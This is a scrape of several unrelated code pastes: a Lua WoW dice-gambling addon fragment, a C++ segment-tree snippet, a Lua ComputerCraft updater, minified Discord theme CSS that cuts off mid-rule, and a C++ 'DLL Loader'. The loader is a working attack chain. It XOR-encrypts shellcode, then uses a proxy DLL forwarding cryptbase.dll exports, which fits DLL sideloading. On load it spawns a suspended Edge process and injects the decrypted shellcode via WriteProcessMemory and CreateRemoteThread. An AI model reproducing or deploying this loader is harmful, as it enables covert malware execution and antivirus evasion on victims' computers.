    local name, roll, min, max = message:match(ROLL_PATTERN)
    if name and name == UnitName(""player"") then -- Only handle rolls for us
        local game = GetFirstUnfinishedGame();
        if (game == nil) then
            return; -- No game to handle
        end
        AssignRollToGame(game, tonumber(roll));
        HandleGameLogic(game)
    end
end

local function OnChatMessage(message, playerName)
    if (HasCurrentGame(playerName)) then
        local lowerMessage = string.lower(message);
        if (lowerMessage == string.lower(GAME_DICE_KEYWORD_OVER) or lowerMessage == string.lower(GAME_DICE_KEYWORD_UNDER)) then
            local game = GetCurrentGame(playerName);
            game.choice = lowerMessage;
            DoGameRolls(game);
        end
    end
end

local eventHandlers = {
    [""CHAT_MSG_SYSTEM""] = OnSystemMessage,
    [""CHAT_MSG_SAY""] = OnChatMessage,
    [""TRADE_REQUEST_CANCEL""] = OnTradeRequestCancel,
    [""TRADE_SHOW""] = OnTradeShow,
    [""TRADE_MONEY_CHANGED""] = OnTradeMoneyChanged,
    [""UI_INFO_MESSAGE""] = OnUiInfoMessage
}

local frame = CreateFrame(""Frame"");
frame:RegisterEvent(""CHAT_MSG_SYSTEM"");
frame:RegisterEvent(""CHAT_MSG_SAY"");
frame:RegisterEvent(""TRADE_ACCEPT_UPDATE"");
frame:RegisterEvent(""TRADE_REQUEST_CANCEL"");
frame:RegisterEvent(""TRADE_SHOW"");
frame:RegisterEvent(""TRADE_CLOSED"");
frame:RegisterEvent(""TRADE_MONEY_CHANGED"");
frame:RegisterEvent(""UI_INFO_MESSAGE"")
frame:SetScript(""OnEvent"", function(self, event, ...)
    local args = {...};
    local eventHandler = eventHandlers[event];
    if eventHandler then
        eventHandler(unpack(args));
    end
end);
frame:HookScript(""OnUpdate"", function(self, elapsed)
    OnUpdate(elapsed);
end);

SLASH_DICEGAMES1 = ""/dicegames"";
SLASH_DICEGAMES2 = ""/dg"";
SlashCmdList[""DICEGAMES""] = function(message)
    print(""Open prizes:"");
    for player, amount in pairs(OPEN_PRIZES) do
        if (amount >= 1) then
            print(player.."": ""..CopperToMoneyString(amount));
        end
    end
    print(""Open games:"");
    for playerName, game in pairs(CURRENT_GAMES) do
        print(playerName, game, game.bet, game.choice);
    end
end"
wKSzqPWC,k-я единица ДО,nq1s788,C++,Tuesday 17th of June 2025 11:31:09 AM CDT,"int get(int t, int l, int r, int k) {
    if (r - l == 1) {
        return l;
    }
    int m = (r + l) / 2;
    if (k > tree[2 * t + 1]) {
        get(t * 2 + 2, m, r, k - tree[2 * t + 1]);
    } else {
        get(t * 2 + 1, l, m, k);
    }
}

void update(int t, int l, int r, int x) {
    if (x < l || r <= x) {
        return;
    }
    if (r - l == 1) {
        tree[t] ^= 1;
        return;
    }
    int m = (l + r) / 2;
    update(t * 2 + 1, l, m, x);
    update(t * 2 + 2, m, r, x);
    tree[t] = tree[t * 2 + 1] + tree[t * 2 + 2];
}"
m8jeRd4D,DLL Loader,EngEhabFahmi,C++,Tuesday 17th of June 2025 11:16:29 AM CDT,"// DLL Loader
// https://www.7-zip.org/download.html
// ===============================================================
// 1st file:
 
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
 
// Function to XOR encrypt the buffer using the provided key
void xorEncrypt(std::vector<unsigned char>& buf, const std::string& key) {
    size_t keyLen = key.length();
    for (size_t i = 0; i < buf.size(); ++i) {
        buf[i] ^= key[i % keyLen];
    }
}
 
int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << ""Usage: "" << argv[0] << "" <input_shellcode> <xor_key> <output_file>"" << std::endl;
        return 1;
    }
 
    std::string inputFile = argv[1];
    std::string key = argv[2];
    std::string outputFile = argv[3];
 
    // Open input shellcode file
    std::ifstream file(inputFile, std::ios::binary);
    if (!file) {
        std::cerr << ""Error: Cannot open input file."" << std::endl;
        return 1;
    }
 
    // Read the file into a buffer
    std::vector<unsigned char> buf((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
 
    if (buf.empty()) {
        std::cerr << ""Error: Input shellcode file is empty."" << std::endl;
        return 1;
    }
 
    // XOR encrypt the buffer
    xorEncrypt(buf, key);
 
    // Write XORed shellcode to output file
    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        std::cerr << ""Error: Cannot create output file."" << std::endl;
        return 1;
    }
 
    outFile.write(reinterpret_cast<char*>(buf.data()), buf.size());
    outFile.close();
 
    std::cout << ""[+] Shellcode encrypted and saved to: "" << outputFile << std::endl;
 
    return 0;
}
 
// ===============================================================
// 2nd File: 

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <thread>
#include <random>
#include ""resource.h""
 
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)
 
#pragma comment(linker, ""/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1"")
#pragma comment(linker, ""/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2"")
#pragma comment(linker, ""/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3"")
#pragma comment(linker, ""/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4"")
#pragma comment(linker, ""/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5"")
#pragma comment(linker, ""/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6"")
#pragma comment(linker, ""/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7"")
#pragma comment(linker, ""/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8"")
#pragma comment(linker, ""/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9"")
#pragma comment(linker, ""/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10"")
#pragma comment(linker, ""/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11"")
 
const char key[] = ""Uoajs2@ahiushidasd"";
 
 
// Enhanced debugging function with timestamp and process ID
void DebugLog(const char* msg, LPVOID ptr = nullptr) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf(""[%02d:%02d:%02d.%03d] [PID: %d] %s"",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        GetCurrentProcessId(), msg);
 
    if (ptr) {
        printf("" [Pointer: 0x%p]"", ptr);
    }
    printf(""\n"");
}
 
void PauseForDebug(const char* msg) {
    DebugLog(msg);
    std::cout << ""Press Enter to continue..."";
    std::cin.ignore();
}
 
void HexDump(const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    printf(""Hex dump (%zu bytes):\n"", size);
    for (size_t i = 0; i < size; ++i) {
        printf(""%02X "", p[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) {
            printf(""\n"");
        }
    }
}
 
void DecryptShellcode(BYTE* data, DWORD size) {
    //DebugLog(""Starting shellcode decryption..."");
    int keyLength = sizeof(key) - 1;
 
    //DebugLog(""Shellcode before decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
 
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % keyLength];
    }
 
    //DebugLog(""Shellcode after decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
    //DebugLog(""Shellcode decryption completed"");
}
 
void InjectShellcodeIntoNotepad() {
    DebugLog(""Starting shellcode injection process"");
 
    // Create notepad.exe process suspended
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
 
    if (!CreateProcess(L""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DebugLog(""[!] Failed to create notepad process!"");
        return;
    }
 
    DebugLog(""Notepad.exe created successfully (suspended)"");
    DebugLog(""Notepad process information:"", pi.hProcess);
    printf(""  Process ID: %d\n"", pi.dwProcessId);
    printf(""  Thread ID: %d\n"", pi.dwThreadId);
    PauseForDebug(""Notepad process created - check with Process Explorer"");
 
    HMODULE hModule = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)InjectShellcodeIntoNotepad, &hModule)) {
        DebugLog(""[!] Failed to get module handle!"");
        return;
    }
    DebugLog(""Module handle obtained:"", hModule);
    PauseForDebug(""Module handle fetched - ready to access resources"");
 
    // Find and load the resource
    DebugLog(""Locating resource..."");
    HRSRC resHandle = FindResource(hModule, MAKEINTRESOURCE(IDR_SHELL1), L""SHELL"");
    if (!resHandle) {
        DebugLog(""[!] Resource not found!"");
        return;
    }
    DebugLog(""Resource found:"", resHandle);
 
    DWORD resSize = SizeofResource(hModule, resHandle);
    HGLOBAL resData = LoadResource(hModule, resHandle);
    void* resPtr = LockResource(resData);
 
    if (!resPtr || resSize == 0) {
        DebugLog(""[!] Failed to load resource data!"");
        return;
    }
 
    DebugLog(""Resource loaded successfully"");
    printf(""  Resource size: %d bytes\n"", resSize);
    printf(""  Resource pointer: 0x%p\n"", resPtr);
    PauseForDebug(""Resource loaded - ready to process"");
 
    // Allocate memory for shellcode
    BYTE* pShellcode = (BYTE*)VirtualAlloc(0, resSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pShellcode == NULL) {
        DebugLog(""[!] Memory allocation failed!"");
        return;
    }
 
    DebugLog(""Memory allocated for shellcode:"", pShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Memory allocated - ready to copy shellcode"");
 
    // Copy resource data to allocated memory
    memcpy(pShellcode, resPtr, resSize);
    DebugLog(""Shellcode copied to allocated memory"");
    PauseForDebug(""Shellcode copied - ready to decrypt"");
 
    // Decrypt the shellcode
    //DebugLog(""Starting shellcode decryption..."");
    DecryptShellcode(pShellcode, resSize);
    //PauseForDebug(""Shellcode decrypted - ready to inject"");
 
    // Allocate memory in the notepad process
    LPVOID pRemoteShellcode = VirtualAllocEx(pi.hProcess, NULL, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteShellcode) {
        //DebugLog(""[!] Failed to allocate memory in target process!"");
        return;
    }
 
    DebugLog(""Memory allocated in Notepad process:"", pRemoteShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Remote memory allocated - ready to write shellcode"");
 
    // Write the decrypted shellcode into the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode, pShellcode, resSize, &bytesWritten)) {
        //DebugLog(""[!] Failed to write shellcode to Notepad process!"");
        return;
    }
 
    DebugLog(""Shellcode written to Notepad process"");
    printf(""  Bytes written: %zu/%d\n"", bytesWritten, resSize);
    PauseForDebug(""Shellcode written - ready to execute"");
 
    // Create a remote thread in the notepad process to execute the shellcode
    DebugLog(""Creating remote thread..."");
    system(""pause"");
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    if (!hThread) {
        //DebugLog(""[!] Failed to create remote thread!"");
        return;
    }
 
    DebugLog(""Remote thread created successfully:"", hThread);
    printf(""  Thread ID: %d\n"", GetThreadId(hThread));
    PauseForDebug(""Remote thread created - shellcode executing"");
 
    // Wait for the thread to complete (optional)
    DebugLog(""Waiting for shellcode execution to complete..."");
    //WaitForSingleObject(hThread, INFINITE);
 
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    DebugLog(""Shellcode execution completed"");
    printf(""  Exit code: 0x%08X\n"", exitCode);
 
    // Clean up
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
 
    // Free local shellcode memory
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    //DebugLog(""Injection process completed successfully"");
    //PauseForDebug(""EXITing...."");
}
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        DebugLog(""DLL attached to process"");
        //Sleep(12000);
        InjectShellcodeIntoNotepad();
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"
ZDcrJian,initupdate.lua,Ubidibity,Lua,Tuesday 17th of June 2025 11:12:24 AM CDT,"-- initupdate.lua: Downloads the latest init.lua from Pastebin

local function updateProgram(pastebinCode, programName)
  print(""Starting update process for "" .. programName .. ""..."")
  if fs.exists(programName) then
    print(""Deleting old version of "" .. programName .. ""..."")
    fs.delete(programName)
    if not fs.exists(programName) then
      print(""Old version deleted successfully."")
    else
      error(""Failed to delete old version of "" .. programName)
    end
  else
    print(""No old version of "" .. programName .. "" found."")
  end

  print(""Downloading new version from Pastebin..."")
  local success = shell.run(""pastebin"", ""get"", pastebinCode, programName)
  if success then
    print(""Successfully downloaded "" .. programName .. "" from Pastebin."")
    print(""Update complete! You can now run "" .. programName .. ""."")
  else
    error(""Failed to download "" .. programName .. "" from Pastebin. Check the Pastebin code or internet connection."")
  end
end

-- Update init.lua
local programName = ""init.lua""
local pastebinCode = ""ypw1WRQa"" -- Replace with actual Pastebin code
updateProgram(pastebinCode, programName)
"
Pgm84jfR,Untitled,Robhies,CSS,Tuesday 17th of June 2025 11:06:28 AM CDT,"/*! ClearVision v7.0.1 by ClearVision Team */@keyframes cv-channel-select{from{right:100%}to{right:0}}@keyframes cv-card-loading{0%{opacity:.66}50%{opacity:.33}100%{opacity:.66}}/*! ClearVision v7.0.1 by ClearVision Team */.info__2debe::after{content: none;color:var(--text-muted);font-size:12px;line-height:1.3333333333;font-weight:400;font-family:var(--font-primary)}.visual-refresh:not(.platform-osx) .leading_c38106::before{content:""ClearVision"";position:static;margin-left:10px;font-size:16px;font-weight:600;color:var(--text-normal);order:2;filter:drop-shadow(0 0 5px var(--hsl-main-color))}.visual-refresh:not(.platform-osx) .leading_c38106::after{content:""7.0.1"";position:static;margin-top:-5px;margin-left:5px;font-family:var(--code-font);font-size:11px;font-weight:600;color:var(--text-muted);order:3}/*! ClearVision v7.0.1 by ClearVision Team */.button__201d5{border-radius:4px}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5){background-color:var(--hsl-main-color);border:none}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):hover{background-color:var(--hsl-hover-color)}.lookFilled__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):disabled{background-color:var(--hsl-main-color)}.lookFilled__201d5.colorGreen__201d5{background-color:var(--hsl-success-color);border:none}.lookFilled__201d5.colorGreen__201d5:hover{background-color:hsl(from var(--hsl-success-color) h s l/0.8)}.lookFilled__201d5.colorGreen__201d5:disabled{background-color:hsl(from var(--hsl-success-color) h s l/0.8)}.lookFilled__201d5.colorRed__201d5{background-color:var(--hsl-danger-color);border:none}.lookFilled__201d5.colorRed__201d5:hover{background-color:hsl(from var(--hsl-danger-color) h s l/0.8)}.lookFilled__201d5.colorRed__201d5:disabled{background-color:var(--hsl-danger-color)}.lookFilled__201d5:is(.colorWhite__201d5,.colorBrandInverted__201d5){color:var(--hsl-main-color);border:none}.lookFilled__201d5:is(.colorWhite__201d5,.colorBrandInverted__201d5):hover{color:var(--hsl-hover-color)}.lookOutlined__201d5:is(.colorBrand__201d5,.colorPrimary__201d5){border-color:var(--hsl-main-color)}.lookOutlined__201d5:is(.colorBrand__201d5,.colorPrimary__201d5):hover{border-color:var(--hsl-hover-color);background-color:var(--hsl-hover-color)}.lookOutlined__201d5.colorGreen__201d5{border-color:var(--hsl-success-color)}.lookOutlined__201d5.colorGreen__201d5:hover{border-color:hsl(from var(--hsl-success-color) h s l/0.8);background-color:hsl(from var(--hsl-success-color) h s l/0.8)}.lookOutlined__201d5.colorRed__201d5{background-color:rgba(0,0,0,0);border-color:var(--hsl-danger-color);color:var(--button-outline-brand-text)}.lookOutlined__201d5.colorRed__201d5:hover{border-color:hsl(from var(--hsl-danger-color) h s l/0.8);background-color:hsl(from var(--hsl-danger-color) h s l/0.8);color:var(--button-outline-brand-text)}.lookLink__201d5 .contents__201d5{background:none}.lookLink__201d5:hover .contents__201d5{text-decoration:underline}:is(.theme-light,.theme-dark) .lookLink__201d5:is(.colorPrimary__201d5,.colorLink__201d5){color:var(--hsl-main-color)}.lookLink__201d5.colorBrand__201d5{color:var(--hsl-main-color)}.lookLink__201d5.colorRed__201d5{color:var(--hsl-danger-color)}/*! ClearVision v7.0.1 by ClearVision Team */.checkbox_f525d3{border-radius:4px}.checkbox_f525d3.checked_f525d3{border-color:var(--hsl-main-color);background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.input__0f084{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.input__0f084::-moz-placeholder{color:var(--text-muted)}.input__0f084::placeholder{color:var(--text-muted)}.input__0f084:focus,.input__0f084.focused__0f084{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.input__0f084.inputField_d64f22{border:none;background:none}.input__0f084 .multiInputField_b404ff{background:rgba(0,0,0,0)}.copyInput_cedfaf .input__0f084{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.item__001a7[aria-checked=true]{background-color:rgba(0,0,0,0)}.refreshIconStroke__001a7{r:10 !important;stroke:var(--interactive-active)}.refreshIcon__001a7{fill:var(--interactive-active)}.radioIndicatorChecked__001a7{color:var(--interactive-active)}.radioIndicatorChecked__001a7 .refreshIconFill__001a7{fill:none}.radioIndicatorChecked__001a7 .refreshIconStroke__001a7{stroke:var(--interactive-active)}.radioBar__001a7{background-color:var(--hsl-card-shading);transition:all .1s ease}.radioBar__001a7:hover{box-shadow:inset 0 0 0 2px var(--radio-bar-accent-color, var(--hsl-hover-color))}.item__001a7[aria-checked=true] .radioBar__001a7{background-color:var(--radio-bar-accent-color, var(--hsl-main-color))}/*! ClearVision v7.0.1 by ClearVision Team */.slider_a562c8 .bar_a562c8,.slider_a562c8 .markDash_a562c8{background:var(--hsl-card-shading)}.slider_a562c8 .barFill_a562c8{background:var(--hsl-main-color)}.slider_a562c8 .grabber_a562c8{filter:drop-shadow(0 0 3px var(--hsl-main-color))}/*! ClearVision v7.0.1 by ClearVision Team */.container__87bf1{background:hsl(from var(--interactive-normal) h s l/0.2) !important}.container__87bf1.checked__87bf1{background:var(--hsl-main-color) !important}.container__87bf1.checked__87bf1 path{fill:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .top_b3f026 .item_b3f026{--selected-tab-item-color: var(--hsl-hover-color)}.visual-refresh .top_b3f026 .item_b3f026.selected_b3f026{--selected-tab-item-color: var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026:hover:not(.disabled_b3f026){background-color:var(--background-modifier-accent)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026.selected_b3f026{background-color:var(--hsl-main-color)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026.selected_b3f026:hover:not(.disabled_b3f026){background-color:var(--hsl-main-color)}.header_b3f026{color:var(--hsl-main-color);display:flex;align-items:center;justify-content:center}.header_b3f026::before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, var(--hsl-main-color) 50%, transparent);margin-right:5px}.header_b3f026::after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, var(--hsl-main-color) 50%, transparent);margin-left:5px}/*! ClearVision v7.0.1 by ClearVision Team */.container_a45028{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.container_a45028:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.visual-refresh .container_fea832{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .container_fea832:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(html,body,.appMount__51fd7){background:none}.app_a3002d{background:var(--hsl-background-shading);color:rgba(0,0,0,0)}.app__160d8{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.1))}.visual-refresh .bg__960e4{background:var(--background-image) var(--background-position)/var(--background-size) no-repeat;background-attachment:var(--background-attachment);filter:var(--background-filter);z-index:-1}.visual-refresh .container_a2f514{background:var(--hsl-background-shading)}.wanderingCubes__0b5bb .item__0b5bb{background:var(--hsl-main-color)}.path__0b5bb{stroke:var(--hsl-main-color)}.focus-rings-ring{box-shadow:0 0 0 4px var(--focus-color)}/*! ClearVision v7.0.1 by ClearVision Team */::-moz-placeholder{font-family:var(--main-font)}body,button,input,select,textarea,::placeholder{font-family:var(--main-font)}code{font-family:var(--code-font)}::-moz-selection{background:var(--hsl-main-color);color:var(--text-normal)}::selection{background:var(--hsl-main-color);color:var(--text-normal)}/*! ClearVision v7.0.1 by ClearVision Team */.bar_c38106{background-color:rgba(0,0,0,0);padding-left:0}.leading_c38106{gap:0;margin:0 6px}/*! ClearVision v7.0.1 by ClearVision Team */.notice__6e2b9{border-radius:4px;background:hsl(from var(--custom-notice-background, var(--hsl-main-color)) h s l/0.8)}.colorBrand__6e2b9{--custom-notice-background: var(--hsl-main-color)}.colorDanger__6e2b9{--custom-notice-background: var(--hsl-danger-color)}.colorStreamerMode__6e2b9{--custom-notice-background: var(--hsl-streaming-color)}/*! ClearVision v7.0.1 by ClearVision Team */:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar{width:14px}:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-thumb,:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-track{border:3px solid rgba(0,0,0,0);border-radius:7px}:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-track{background:rgba(0,0,0,0)}:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar{width:8px}:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar-thumb,:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar-track{border:3px solid rgba(0,0,0,0);border-radius:5px}:is(:is(.auto__99f8c,.auto_d125d2),:is(.thin__99f8c,.thin_d125d2))::-webkit-scrollbar-thumb{background-color:var(--hsl-main-color)}:is(:is(.auto__99f8c,.auto_d125d2),:is(.thin__99f8c,.thin_d125d2))::-webkit-scrollbar-thumb:active{background-color:var(--hsl-hover-color)}/*! ClearVision v7.0.1 by ClearVision Team */.mediaBarProgress_b26b79,.mediaBarProgress_b26b79::before,.mediaBarProgress_b26b79::after{background:var(--hsl-main-color)}.mediaBarGrabber_b26b79,.mediaBarInteraction_b26b79:hover .mediaBarGrabber_b26b79,.mediaBarInteractionDragging_b26b79 .mediaBarGrabber_b26b79{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .authBox__921c5{background-color:var(--hsl-modal-shading)}.list__920b8{background-color:var(--background-modifier-accent)}.navRow__86e92{background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.numberBadge__2b1f5,.textBadge__2b1f5{background:var(--hsl-main-color) !important;color:var(--header-primary)}/*! ClearVision v7.0.1 by ClearVision Team */.refresh-fast-follow-guild-bg.visual-refresh .bg__960e4{background:var(--background-image) var(--background-position)/var(--background-size) no-repeat;background-attachment:var(--background-attachment);filter:var(--background-filter);z-index:-1}.refresh-fast-follow-guild-bg.visual-refresh .guilds_c48ade{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .chat_f75fb0{background:rgba(0,0,0,0)}.visual-refresh .chat_f75fb0[data-has-border=true]{border:none}.visual-refresh .chat_f75fb0.threadSidebarOpen_f75fb0{border-bottom-right-radius:0}.visual-refresh.theme-midnight .content_f75fb0{border:none}.visual-refresh :is(.chatContent_f75fb0,.scroller__28a87){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh :is(.wrapper_d852db,.wrapper_fc8177){background-color:rgba(0,0,0,0)}.visual-refresh .wrapper_d852db{animation:cv-card-loading 1.5s infinite ease-in-out}.visual-refresh .wrapper_f7ecac{background-color:var(--hsl-popout-shading);border-color:var(--hsl-popout-shading);box-shadow:none}.noChannel__01d5c{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .form_f75fb0{margin-top:4px}.visual-refresh .channelTextArea__74017{background-color:var(--hsl-input-shading);box-shadow:0 0 0 2px var(--hsl-input-border-shading);border-color:rgba(0,0,0,0)}.visual-refresh .channelTextArea__74017:focus-within{border-color:rgba(0,0,0,0);box-shadow:0 0 2px 2px var(--hsl-main-color)}.visual-refresh .stackedBars__74017,.visual-refresh .channelAttachmentArea_b77158{background:rgba(0,0,0,0)}.visual-refresh .upload_aa605f{background:var(--hsl-card-shading);border:none}.threadSuggestionBar__841c8,.themedBackground__74017{background:rgba(0,0,0,0)}.scrollableContainer__74017::-webkit-scrollbar-thumb{background-color:var(--hsl-main-color)}.visual-refresh :is(.inlineCode_ada32f,.after_inlineCode_ada32f,.before_inlineCode_ada32f){background:hsl(from var(--hsl-card-shading) h s calc(100 - l)/calc(alpha * 0.5))}.activeButtonChild_aa63ab{color:var(--interactive-normal)}:is(.theme-light,.theme-dark) .button_aa63ab:is(:focus,:focus-within,:hover) .activeButtonChild_aa63ab{color:var(--interactive-active)}.toolbar_bba883{background-color:var(--hsl-popout-shading)}.toolbar_bba883::before{border-top-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapper_cb9592,.visual-refresh .channelChatWrapper_cb9592{background:rgba(0,0,0,0)}.visual-refresh .callContainer_cb9592{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4));border:none}.visual-refresh .root_bfe55a{background:rgba(0,0,0,0)}.gradientBackground__11664{background:none}.sphere__11664{background:none;border:none;animation:none}.buttonSection__1405b.experimentButtonSection__1405b{background:var(--hsl-popout-shading);border:none;border-radius:4px}.colorable_f1ceac.disconnect_f1ceac{background:var(--hsl-danger-color)}.border__2f4f7.speaking__2f4f7{box-shadow:inset 0 0 0 2px var(--hsl-main-color)}.wrapper_cb9592.minimum_cb9592 .callContainer_cb9592{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.6))}.quickSelectPopout_ebaca5{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.divider__908e2{--divider-color: var(--hsl-main-color)}.divider__908e2.hasContent__908e2{border-color:rgba(0,0,0,0)}.visual-refresh .content__908e2{display:flex;flex:1;background-color:rgba(0,0,0,0);align-items:center;font-weight:700}.content__908e2::before,.content__908e2::after{content:"""";height:1px;flex-grow:1;background:var(--background-modifier-accent)}.content__908e2::before{margin-right:10px}.content__908e2::after{margin-left:10px}.isUnread__908e2 .content__908e2::before,.isUnread__908e2 .content__908e2::after{background:var(--divider-color)}/*! ClearVision v7.0.1 by ClearVision Team */.avatar_c19a55{transition:all .3s ease-in-out,transform .1s ease-in-out}.avatar_c19a55.clickable_c19a55:active{transform:scale(0.9)}.botTagRegular__82f07{background:var(--hsl-main-color);color:var(--header-primary)}.operations_bab751 a{color:var(--hsl-main-color)}.content__235ca a{color:var(--text-link)}.visual-refresh .markup__75297 code{background:var(--hsl-card-shading);border:1px solid var(--hsl-card-shading-inverted)}.visual-refresh .markup__75297 code.inline{border:none;background:hsl(from var(--hsl-card-shading) h s calc(100 - l)/calc(alpha * 0.5));padding:2px 6px}.repliedMessageClickableSpine_c19a55{border-color:var(--hsl-main-color)}.repliedMessageClickableSpine_c19a55:hover,.repliedMessageClickableSpine_c19a55.repliedMessageContentHovered_c19a55{border-color:var(--hsl-hover-color)}.repliedTextPreview_c19a55{color:var(--text-normal);opacity:.7}.repliedTextPreview_c19a55 .clickable_c19a55:hover,.repliedTextPreview_c19a55 .repliedMessageClickableSpineHovered_c19a55{opacity:1}.messageSpine_c19a55::before{border-color:var(--hsl-main-color)}.executedCommand_c19a55 .appLauncherOnboardingCommandName_c19a55{color:var(--hsl-main-color);background:rgba(0,0,0,0)}.executedCommand_c19a55 .appLauncherOnboardingCommandName_c19a55:hover{color:var(--hsl-hover-color);background:rgba(0,0,0,0)}.replying__5126c{--background-mentioned: hsl(from var(--hsl-main-color) h s l/.1);--background-mentioned-hover: hsl(from var(--hsl-hover-color) h s l/.1);background:var(--background-mentioned)}.replying__5126c:hover,.replying__5126c .selected__5126c{background:var(--background-mentioned-hover) !important}.replying__5126c::before{background:var(--hsl-hover-color)}.wrapper_f61d60{background-color:var(--hsl-main-color);color:var(--text-normal);border-radius:5px;padding:0 4px}.wrapper_f61d60:hover{background-color:var(--hsl-hover-color)}.mentioned__5126c{--background-mentioned: hsl(from var(--hsl-main-color) h s l/.1);--background-mentioned-hover: hsl(from var(--hsl-hover-color) h s l/.1)}.mentioned__5126c:before{background-color:var(--hsl-main-color)}.blockquoteContainer__75297 .blockquoteDivider__75297{border-radius:0}.bumpBox_cacd02{background:var(--hsl-card-shading)}.visual-refresh .embedFull__623de{background:var(--hsl-card-shading);border-top:none;border-right:none;border-bottom:none}.visual-refresh .file__0ccae{background:var(--hsl-card-shading);border:none}.visual-refresh .progressBar__89dcd{background:var(--hsl-main-color) !important}.visual-refresh .wrapper_d5f3cd{background:var(--hsl-card-shading);border:none}.visual-refresh .statusOnline_d5f3cd{background:var(--hsl-online-color)}.visual-refresh .statusOffline_d5f3cd{background:var(--hsl-offline-color)}.visual-refresh .guildInviteContainer__083ae{background:var(--hsl-card-shading)}.visual-refresh 